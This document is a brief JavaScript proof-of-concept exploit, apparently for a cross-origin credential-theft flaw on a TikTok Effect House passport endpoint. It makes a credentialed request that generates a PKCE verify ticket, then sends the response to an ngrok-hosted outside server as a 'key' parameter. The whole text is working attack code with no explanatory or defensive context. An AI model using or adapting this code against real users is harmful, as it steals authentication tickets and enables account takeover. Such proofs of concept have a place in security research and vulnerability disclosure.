var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "https://effecthouse.tiktok.com/passport/web/gen_pkce_verify_ticket/?aid=1459&code_challenge=1445d85618e42015ca006df50b1af7ef&language=en");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//0e11-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
